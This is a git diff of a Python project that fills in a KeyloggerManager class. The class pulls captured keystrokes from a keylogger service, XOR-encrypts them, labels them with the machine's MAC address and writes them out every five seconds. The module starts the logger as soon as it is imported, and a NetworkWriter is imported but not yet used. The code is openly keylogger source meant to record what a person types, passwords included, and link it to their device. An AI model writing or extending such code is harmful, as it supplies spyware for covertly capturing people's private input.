@@ -3,11 +3,36 @@ from encryptor import Encryptor
 from writer import Iwriter
 from file_wirter import FileWriter
 from network_writer import NetworkWriter
+from getmac import get_mac_address
+import time
 
 class KeyloggerManager:
 
     def __init__(self):
-        pass
+        self.active = True
+        self.keylogger = KeyloggerService()
+        self.encryptor = Encryptor()
+        self.file_writer = FileWriter()
+        self.main()
 
     def main(self):
-        pass
+        while self.active:
+            data = self.keylogger.data
+            data = self.encryptor.xor(data)
+
+            # אולי עדיף להצפין גם את הכתובת מאק
+            mac_name = self.get_mac_details()
+            wrapper = {mac_name : data}
+            #
+            self.file_writer.send_data(wrapper)
+            time.sleep(5)
+
+    @staticmethod
+    def get_mac_details():
+        return get_mac_address()
+
+    def stop(self):
+        self.active = False
+
+k = KeyloggerManager()
+
